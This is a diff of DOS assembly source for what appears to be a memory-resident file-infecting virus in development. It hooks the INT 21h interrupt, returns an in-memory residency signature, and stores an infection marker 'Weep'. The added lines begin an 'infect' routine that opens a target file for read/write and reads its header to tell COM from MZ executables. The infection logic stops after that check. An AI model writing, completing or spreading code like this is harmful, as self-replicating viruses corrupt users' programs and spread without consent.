@@ -35,6 +35,7 @@ dont_install:
 
 
 new_int21:
+     pusha
      push bp
      push ax
      call near .past_bp
@@ -60,12 +61,26 @@ new_int21:
 goto_int21: db 0EAh, 00h, 00h, 00h, 00h   ; Jump far, absolute, address given in operand
 
 send_msg:
-      mov ax, 8b7bh     ; In Mem Signature
-      iret
+     mov ax, 8b7bh     ; In Mem Signature
+     iret
 
 infect:            ; DS:DX = ASCIIZ Filename pointer
-      
-
+     mov ax, 3d02h
+     int 21h      ; Open file Using Handle, Read Write. OUT: AX = Handle
+     mov bx, ax   ; BX = File Handle
+     push bx
+     xor cx, cx
+     xor dx, dx    ; low order and high order = 0
+     mov ax, 4200h ; Move file pointer
+     int 21h
+     pop bx
+     push bx          ; BX = File Handle
+     mov ax, 3f00h    ; Read file or device
+     mov cx, 2        ; Read 2 bytes, this case from the start to check wheter it's a COM file or an MZ Executable
+     mov dx, data_section.MZ_BUF+bp  ; Pointer to the MZ buffer
+     int 21h          ; Callin int 21h
+        
 data_section:
      .save_bp dw 0
      .file_infected db 'Weep'
+     .MZ_BUF dw 0
